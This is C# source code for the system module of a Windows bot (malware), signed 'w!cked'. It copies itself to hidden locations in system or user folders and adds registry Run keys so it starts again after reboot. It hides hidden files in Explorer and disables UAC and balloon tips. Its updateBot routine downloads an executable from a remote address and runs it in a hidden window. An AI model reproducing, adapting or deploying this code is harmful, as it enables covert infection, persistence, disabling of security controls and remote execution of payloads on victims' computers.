using System;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Threading;
using System.Net;

namespace SysDriver
{
    /* Copyright © 2010 w!cked */

    class cSystem
    {
        private Mutex yMutex;
        private cPersistent PersistentClass = new cPersistent();

        public void loadSystem()
        {
            createMutex();
            DisableProcedures();
            InstallBot();
            PersistentClass.loadPersistent();
        }

        private void createMutex()
        {
            try
            {
                yMutex = new Mutex(true, cMain.ConfigClass.sMutex);
                yMutex.ReleaseMutex();
            }
            catch
            {
                Environment.Exit(0);
            }
        }

        private void InstallBot()
        {
            string sSelfPath = Process.GetCurrentProcess().MainModule.FileName;
            Process pProcess;

            if (cMain.ConfigClass.bAdminStatus == true)
            {
                cMain.ConfigClass.sFilePath[0] = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + cMain.ConfigClass.sFileName[0];
                cMain.ConfigClass.sFilePath[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + @"\" + cMain.ConfigClass.sFileName[1];
            }
            else
            {
                cMain.ConfigClass.sFilePath[0] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + cMain.ConfigClass.sFileName[0];
                cMain.ConfigClass.sFilePath[1] = Environment.GetEnvironmentVariable("TEMP") + @"\" + cMain.ConfigClass.sFileName[1];
            }

            if (checkInstall() == false)
            {
                try
                {
                    foreach (string sPath in cMain.ConfigClass.sFilePath)
                    {
                        if (cMain.FunctionClass.checkFile(sPath) == false) { File.Copy(sSelfPath, sPath); }
                        File.SetAttributes(sPath, FileAttributes.Hidden);
                    }
                }
                catch { }

                if (cMain.ConfigClass.bAdminStatus == true)
                {
                    try
                    {
                        Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue(cMain.ConfigClass.sRegName[0], ('"' + cMain.ConfigClass.sFilePath[0] + '"'));
                        Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true).SetValue(cMain.ConfigClass.sRegName[1], ('"' + cMain.ConfigClass.sFilePath[1] + '"'));
                    }
                    catch { }
                }
                else
                {
                    try
                    {
                        Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue(cMain.ConfigClass.sRegName[0], ('"' + cMain.ConfigClass.sFilePath[0] + '"'));
                        Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true).SetValue(cMain.ConfigClass.sRegName[1], ('"' + cMain.ConfigClass.sFilePath[1] + '"'));
                    }
                    catch { }
                }

                try
                {
                    yMutex.Close();

                    foreach (string sFile in cMain.ConfigClass.sFilePath)
                    {
                        pProcess = new Process();
                        pProcess.StartInfo.FileName = sFile;
                        pProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        pProcess.Start();
                    }
                }
                catch { }

                Environment.Exit(0);
            }
        }

        public void updateBot(string sFileAddress)
        {
            Process pProcess;

            try
            {
                yMutex.Close();
            }
            catch { }

            try
            {
                string sFile = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
                new WebClient().DownloadFile(sFileAddress, Environment.GetEnvironmentVariable("TEMP") + @"\" + sFile);
                pProcess = new Process();
                pProcess.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + @"\" + sFile;
                pProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                pProcess.Start();
            }
            catch { }

            Environment.Exit(0);
        }

        public void RemoveBot()
        {
            PersistentClass.stopPersistent();

            if (cMain.ConfigClass.bAdminStatus == true)
            {
                try
                {
                    Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue(cMain.ConfigClass.sRegName[0]);
                    Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true).DeleteValue(cMain.ConfigClass.sRegName[1]);
                }
                catch { }
            }
            else
            {
                try
                {
                    Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue(cMain.ConfigClass.sRegName[0]);
                    Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true).DeleteValue(cMain.ConfigClass.sRegName[1]);
                }
                catch { }
            }

            try
            {
                foreach (string sPath in cMain.ConfigClass.sFilePath)
                {
                    File.Delete(sPath);
                }
            }
            catch { }

            Environment.Exit(0);
        }

        private bool checkInstall()
        {
            foreach (string sPath in cMain.ConfigClass.sFilePath)
            {
                if (cMain.FunctionClass.checkFile(sPath) == false) { return false; }
            }

            return true;
        }

        private void DisableProcedures()
        {
            try
            {
                Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true).SetValue("Hidden", "2", RegistryValueKind.DWord);
            }
            catch { }

            if (cMain.ConfigClass.bDisableUAC)
            {
                try
                {
                    Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true).SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
                }
                catch { }

                try
                {
                    Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                    Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                }
                catch { }
            }
        }
    }
}
